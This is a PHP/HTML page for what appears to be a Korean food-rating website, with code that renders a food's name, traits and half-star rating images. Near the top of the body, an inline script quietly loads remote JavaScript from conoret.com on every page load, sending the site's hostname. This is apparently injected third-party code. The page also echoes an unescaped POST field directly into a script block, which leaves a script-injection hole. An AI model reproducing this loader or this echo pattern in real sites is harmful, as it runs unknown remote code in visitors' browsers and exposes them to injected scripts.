<!DOCTYPE html>
<?php
include 'script/modules/CookieManager.php';
(CookieManager::factory())->refreshCookie();
?>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="ssosso.table.u">
    <meta name="generator" content="ssosso.table food-db 0.1.0">
    <link rel="icon" href="src/favicon.png">

    <title>ssosso-table.food-db.record</title>

    <link rel="canonical" href="http://ssossotable.com">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
    <style>
        .bd-placeholder-img {
            font-size: 1.125rem;
            text-anchor: middle;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
        }

        @media (min-width: 768px) {
            .bd-placeholder-img-lg {
                font-size: 3.5rem;
            }
        }
    </style>

    <!-- Custom styles for this template -->
    <script src="./script/main/dsp" type="text/javascript" defer="" async=""></script>
    <link rel="preconnect" href="https://fonts.googleapis.com/" crossorigin="true">
    <link rel="preconnect" href="https://fonts.gstatic.com/">
    <link rel="stylesheet" href="./css/main/css2">
    <link rel="stylesheet" href="./css/rating/css2">
    <link href="./css/main/cover.css" rel="stylesheet">
    <link rel="stylesheet" href="/css/record.css">
    <style>

        /* iPhone4와 같은 높은 해상도 가로 */
        @media only screen and (max-width : 640px) {
            .nav-link {
                font-size: 10px;
            }
            .masthead-brand {
                width: 40px;
                height: 40px;
            }
        }
    </style>

    <script src="./script/rating/dsp" type="text/javascript" defer="" async=""></script>
    <script
        src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
        crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js" integrity="sha384-oBqDVmMz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.min.js" integrity="sha384-IDwe1+LCz02ROU9k972gdyvl+AESN10+x7tBKgc9I5HFtuNz0wWnPclzo6p9vxnk" crossorigin="anonymous"></script>
    <script src="/script/meal.js" type="text/javascript"></script>
    <script>


        let food_info= <?php echo $_POST['foodid']; ?>

        function getScore() {
            let width=parseInt(arguments[1])/2
            let height=parseInt(arguments[1])

            switch (parseInt(arguments[0])) {
                case 0:
                    return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 1:
                    return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 2:
                    return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 3:
                    return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 4:
                    return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 5: return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 6: return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 7: return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 8: return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 9: return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">`
                default:
                    break
            }
        }
        async function init() {

            console.log(food_info)
            document.getElementById("food-name").innerText=food_info.name
            document.getElementById('food-traits').innerText=String(food_info.trait)
            document.getElementById('rating').innerHTML=getScore(food_info.rating-1,60)
        }
    </script>

    <script src="/script/foodinfo.js" type="text/javascript"></script>


</head>

<body class="text-center vsc-initialized" cz-shortcut-listen="true">
<script type="text/javascript">
    window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
</script>

<div class="cover-container d-flex h-100 p-3 mx-auto flex-column">
    <nav class="navbar d-flex">
        <a class="navbar-brand p-2" href="http://ssossotable.com/rating.php" style="margin-right: auto;"><img class="masthead-brand" src="src/logo.png" width="60px" height="60px"></a>
        <a class="nav-link text-muted p-2" href="http://ssossotable.com/rating.php">음식 평가하기</a>
        <a class="nav-link text-muted p-2" href="http://ssossotable.com/recipe.php">레시피 추가하기</a>
        <a class="nav-link text-muted p-2" href="http://ssossotable.com/record.php">식사 기록하기</a>
        <button style="margin: 10px;" class="navbar-toggler p-2" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavbar" aria-controls="offcanvasNavbar">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasNavbar" aria-labelledby="offcanvasNavbarLabel">
            <div class="offcanvas-header">
                <a  class="offcanvas-title" href="http://ssossotable.com/rating.php"><img class="masthead-brand" src="src/logo.png" width="48px" height="48px"></a>
                <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
            </div>
            <div class="offcanvas-body">
                <ul class="navbar-nav justify-content-end flex-grow-1 pe-3" style="text-align: left;">
                    <li class="nav-item">
                        <a class="nav-link " href="http://ssossotable.com/myInfo.php">내 정보</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/friends.php">친구 목록</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/diary.php">다이어리</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/my-recipe.php">나만의 레시피북</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/insert.php">음식 추가하기(for dev)</a>
                    </li>
                </ul>
                <div class="input-group mb-3 mt-3">
                    <input type="text" class="form-control" placeholder="음식명을 넣어주세요" aria-label="Recipient's username" aria-describedby="button-addon2">
                    <button class="btn btn-outline-secondary" type="button" id="button-addon2">검색</button>
                </div>
            </div>
        </div>
    </nav>

    <main role="main" class="inner cover" id="rating_main"  style="">
        <div class="card">
            <div class="card-body" id="title">
                <img src="/src/Portrait_Placeholder.png" height="240px" width="240px"/>
                <h5 class="card-title" id="food-name">음식 이름</h5>
                <p class="card-text" id="food-traits">특성 목록</p>
            </div>
            <div id="rating" style="margin-bottom: 50px;">
            </div>
        </div>
    </main>

    <footer class="mastfoot mt-auto">
        <div class="inner">
            <p>Created by<a href="http://ssossotable.com"> ssosso.table</a>, by <a href="http://ssossotable.com">@ssosso.table</a></p>
        </div>
    </footer>
</div>
<script>
    init()
</script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
</body>
</html>